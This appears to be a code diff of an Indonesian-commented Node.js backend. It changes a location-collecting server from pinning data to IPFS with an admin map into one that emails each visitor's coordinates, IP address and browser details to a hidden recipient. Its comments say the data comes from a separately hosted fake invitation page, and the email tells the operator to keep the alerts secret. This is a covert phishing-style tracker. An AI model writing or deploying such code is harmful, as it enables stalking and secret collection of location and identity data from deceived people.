@@ -1,182 +1,92 @@
 require("dotenv").config();
 const express = require("express");
-const http = require("http");
-const socketIo = require("socket.io");
-const path = require("path");
-const axios = require("axios"); // Untuk membuat HTTP request ke API IPFS Pinning
+const http = require("http"); // Masih perlu untuk membuat server HTTP
+const nodemailer = require("nodemailer");
 
 const app = express();
 const server = http.createServer(app);
-const io = socketIo(server);
 const PORT = process.env.PORT || 3000;
 
-// Konfigurasi API Pinata (contoh)
-const pinataApiUrl = "https://api.pinata.cloud/pinning/pinJSONToIPFS";
-const pinataApiKey = process.env.IPFS_API_KEY;
-const pinataApiSecret = process.env.IPFS_API_SECRET;
-
-// Middleware untuk melayani file statis
-app.use(express.static(path.join(__dirname, "public")));
-
-// WebSocket connection
-io.on("connection", (socket) => {
-  console.log("Klien terhubung melalui WebSocket");
-
-  socket.on("sendLocation", async (data) => {
-    const { latitude, longitude, accuracy } = data;
-    if (latitude && longitude) {
-      console.log("Lokasi diterima (WebSocket):", {
-        latitude,
-        longitude,
-        accuracy,
-      });
-
-      // Data yang akan dikirim ke IPFS
-      const locationData = {
-        latitude,
-        longitude,
-        accuracy,
-        timestamp: new Date().toISOString(),
-        userAgent: socket.request.headers["user-agent"], // Info browser/OS
-        // Anda bisa tambahkan info lain yang relevan di sini
-      };
-
-      try {
-        // Mengirim data JSON ke Pinata IPFS
-        const pinataResponse = await axios.post(
-          pinataApiUrl,
-          { pinataContent: locationData }, // Data yang akan di-pin
-          {
-            headers: {
-              "Content-Type": "application/json",
-              pinata_api_key: pinataApiKey,
-              pinata_secret_api_key: pinataApiSecret,
-            },
-          },
-        );
-
-        const ipfsHash = pinataResponse.data.IpfsHash;
-        const ipfsUrl = `https://gateway.pinata.cloud/ipfs/${ipfsHash}`; // Atau gateway lain
-
-        console.log("Data lokasi berhasil diunggah ke IPFS:", ipfsUrl);
-
-        // Kirim notifikasi ke klien yang terhubung (misal, halaman pemantau Anda)
-        io.emit("locationUpdate", {
-          latitude,
-          longitude,
-          accuracy,
-          timestamp: locationData.timestamp,
-          ipfsHash,
-          ipfsUrl,
-        });
-
-        // --- (Opsional) Tulis IPFS Hash ke Blockchain ---
-        // Bagian ini memerlukan setup Ethers.js/Web3.js, smart contract,
-        // dan dompet dengan saldo kripto. Sangat kompleks dan mahal di mainnet.
-        // Anda akan memanggil fungsi di smart contract Anda untuk menyimpan ipfsHash.
-        // console.log("Mencoba menulis hash ke blockchain...");
-        // const tx = await yourSmartContract.writeLocationHash(ipfsHash);
-        // await tx.wait(); // Tunggu transaksi dikonfirmasi
-        // console.log("Hash berhasil ditulis ke blockchain:", tx.hash);
-        // --- End Opsional Blockchain ---
-      } catch (error) {
-        console.error(
-          "Gagal mengunggah lokasi ke IPFS:",
-          error.response ? error.response.data : error.message,
-        );
-      }
-    }
-  });
-
-  socket.on("disconnect", () => {
-    console.log("Klien terputus dari WebSocket");
-  });
+// Konfigurasi Nodemailer transporter
+const transporter = nodemailer.createTransport({
+  service: "gmail", // Anda bisa ganti dengan 'outlook', 'yahoo', atau konfigurasi SMTP kustom
+  auth: {
+    user: process.env.EMAIL_USER,
+    pass: process.env.EMAIL_PASS,
+  },
 });
 
-// Halaman pemantau sederhana (tanpa database)
-// Akan menampilkan data yang baru masuk via WebSocket, termasuk IPFS Hash
-app.get("/admin-web3", (req, res) => {
-  res.send(`
-        <!DOCTYPE html>
-        <html lang="id">
-        <head>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>Lokasi Web3 Terdeteksi</title>
-            <style>
-                body { font-family: sans-serif; margin: 20px; }
-                ul { list-style: none; padding: 0; }
-                li { margin-bottom: 10px; padding: 10px; border: 1px solid #eee; border-radius: 5px; background-color: #f9f9f9; }
-                a { color: #007bff; text-decoration: none; }
-                a:hover { text-decoration: underline; }
-            </style>
-            <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
-            <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
-            <script src="/socket.io/socket.io.js"></script>
-        </head>
-        <body>
-            <h1>Lokasi Terdeteksi (Web3)</h1>
-            <div id="map" style="height: 400px; width: 100%; border: 1px solid #ccc; border-radius: 8px; margin-bottom: 20px;"></div>
-            <h2>Data Lokasi:</h2>
-            <ul id="locationList">
-                </ul>
+// Middleware untuk mem-parse JSON dari request body
+app.use(express.json());
 
-            <script>
-                const socket = io();
-                const locationList = document.getElementById('locationList');
-                let map = null;
-                let marker = null;
+// Endpoint utama untuk menerima lokasi
+app.post("/send-location", async (req, res) => {
+  const { latitude, longitude, accuracy } = req.body;
 
-                function initMap(latitude, longitude) {
-                    if (map) {
-                        map.remove();
-                    }
-                    map = L.map('map').setView([latitude, longitude], 13);
-                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                        attribution: '© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
-                    }).addTo(map);
-                    marker = L.marker([latitude, longitude]).addTo(map)
-                        .bindPopup('Lokasi Terkini').openPopup();
-                }
+  if (!latitude || !longitude) {
+    return res.status(400).json({ message: "Data lokasi tidak lengkap." });
+  }
 
-                function updateMap(latitude, longitude) {
-                    if (marker) {
-                        marker.setLatLng([latitude, longitude]);
-                        marker.bindPopup('Lokasi Terkini: ' + new Date().toLocaleString()).openPopup();
-                    } else {
-                        initMap(latitude, longitude);
-                    }
-                    map.setView([latitude, longitude], 16);
-                }
+  // Informasi tambahan yang bisa Anda tangkap dari request (opsional)
+  const userAgent = req.headers["user-agent"] || "Tidak diketahui";
+  const ipAddress = req.ip || req.connection.remoteAddress || "Tidak diketahui";
 
-                socket.on('locationUpdate', (data) => {
-                    console.log('Lokasi diterima via WebSocket:', data);
-                    const li = document.createElement('li');
-                    li.innerHTML = \`
-                        Latitude: \${data.latitude}, Longitude: \${data.longitude}, Akurasi: \${data.accuracy}m, Waktu: \${new Date(data.timestamp).toLocaleString()}<br>
-                        IPFS Hash: <a href="https://gateway.pinata.cloud/ipfs/\${data.ipfsHash}" target="_blank">\${data.ipfsHash}</a>
-                    \`;
-                    locationList.prepend(li);
-                    if (locationList.children.length > 20) {
-                        locationList.removeChild(locationList.lastChild);
-                    }
-                    updateMap(data.latitude, data.longitude);
-                });
+  console.log("Lokasi diterima (POST):", {
+    latitude,
+    longitude,
+    accuracy,
+    userAgent,
+    ipAddress,
+  });
 
-                // Inisialisasi peta dengan lokasi default jika tidak ada data awal
-                document.addEventListener('DOMContentLoaded', () => {
-                    initMap(-6.2088, 106.8456); // Lokasi default (misal: Jakarta)
-                });
-            </script>
-        </body>
-        </html>
-    `);
+  const mapLink = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
+
+  const mailOptions = {
+    from: process.env.EMAIL_USER,
+    to: process.env.RECIPIENT_EMAIL,
+    subject: "LOKASI PONSEL ANDA TERDETEKSI!",
+    html: `
+            <p>Ponsel Anda terdeteksi di lokasi berikut:</p>
+            <ul>
+                <li><strong>Latitude:</strong> ${latitude}</li>
+                <li><strong>Longitude:</strong> ${longitude}</li>
+                <li><strong>Akurasi:</strong> ${
+                  accuracy ? accuracy + " meter" : "Tidak diketahui"
+                }</li>
+                <li><strong>Waktu Deteksi:</strong> ${new Date().toLocaleString(
+                  "id-ID",
+                  { timeZone: "Asia/Jakarta" },
+                )} WIB</li>
+            </ul>
+            <p>Lihat di Peta: <a href="${mapLink}" target="_blank">${mapLink}</a></p>
+            <hr>
+            <p>Detail Tambahan (opsional):</p>
+            <ul>
+                <li>User Agent (Browser/OS): ${userAgent}</li>
+                <li>IP Address: ${ipAddress}</li>
+            </ul>
+            <p>Catatan: Ini adalah notifikasi otomatis dari sistem pelacak Anda. JANGAN SAMPAI TERBUKA OLEH ORANG LAIN!</p>
+        `,
+  };
+
+  try {
+    await transporter.sendMail(mailOptions);
+    console.log("Email notifikasi lokasi berhasil dikirim.");
+    res
+      .status(200)
+      .json({ message: "Lokasi berhasil diterima dan dikirim via email." });
+  } catch (error) {
+    console.error("Gagal mengirim email notifikasi lokasi:", error);
+    res
+      .status(500)
+      .json({ message: "Terjadi kesalahan saat mengirim email notifikasi." });
+  }
 });
+
+// Server hanya akan melayani endpoint POST ini. Tidak ada halaman admin atau file statis dari sini.
+// Pastikan frontend (undangan palsu) Anda dihosting terpisah (Vercel/Netlify).
 
 server.listen(PORT, () => {
-  console.log(`Server berjalan di http://localhost:${PORT}`);
-  console.log(`Frontend diakses di http://localhost:${PORT}`);
-  console.log(
-    `Halaman Web3 admin diakses di http://localhost:${PORT}/admin-web3`,
-  );
+  console.log(`Backend server berjalan di http://localhost:${PORT}`);
+  console.log(`Siap menerima lokasi di POST /send-location`);
 });
